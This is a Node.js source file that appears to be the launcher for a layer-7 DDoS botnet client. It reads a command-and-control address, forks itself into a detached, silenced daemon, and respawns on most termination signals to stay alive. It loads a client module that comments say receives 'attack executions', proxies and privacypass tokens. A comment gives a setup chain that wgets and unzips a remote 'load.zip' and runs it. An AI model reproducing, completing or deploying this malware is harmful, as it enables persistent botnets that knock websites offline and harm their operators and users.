// Non-daemon, development usage:
//global.CNC = process.argv[2];

//require('./client');

//return;

// Payload;
// Requirements: Node.js installed;
// npm install request;npm install cloudscraper;npm install zombie;wget ZIP_DOWNLOAD/load.zip;unzip load.zip;node main IP
const child_process = require('child_process');
process.on('SIGCHILD', () => {
    return !1;
}).on('SIGHUP', () => {
    return !1;
});
// Requires and init:
function daemon(script, args) {
    var stdout = 'ignore';
    var stderr = 'ignore';

    var cp_opt = {
        stdio: ['ignore', stdout, stderr],
        env: {
            cnc: CNC,
            __daemon: true
        },
        detached: true
    };

    // spawn the child using the same node process as ours
    var child = child_process.spawn(process.execPath, [script].concat(args), cp_opt);

    // required so the parent can exit
    child.unref();

    return child;
};

function initDaemon() {
    var args = [].concat(process.argv);

    // shift off node
    args.shift();

    // our script name
    var script = args.shift();

    // start ourselves as a daemon
    return daemon(script, args, CNC);
}
// Require CNC client: To receive attack executions, data (proxies, privacypass tokens, and so...)
// we are a daemon, don't daemonize again
if (process.env.__daemon) {
    global.CNC = process.env.cnc;
    require('./client');
    let handled = false;
    global.handleClose = _ => {
        if (handled && !_) return;
        handled = !handled;
        if (!process.updating) {
            initDaemon();
        }
    };
    
    let keepAlive = () => {
        stop_all();
        process.stdin.resume();
        logger('Keeping alive.');
    }
    process.stdin.resume();
    setInterval(keepAlive, 1000 * 60 * 60);
    process.on('SIGTERM', handleClose).on('beforeExit', handleClose).on('exit', handleClose).on('SIGABRT', handleClose).on('SIGINT', handleClose).on('SIGUSR1', handleClose).on('SIGUSR2', handleClose);
} else {
    global.CNC = process.argv[2];
    console.log('[CLIENT L7] Executed, Forking daemon process.');
    initDaemon();
    setTimeout(() => {
        process.exit(6);
    }, 3e3);
}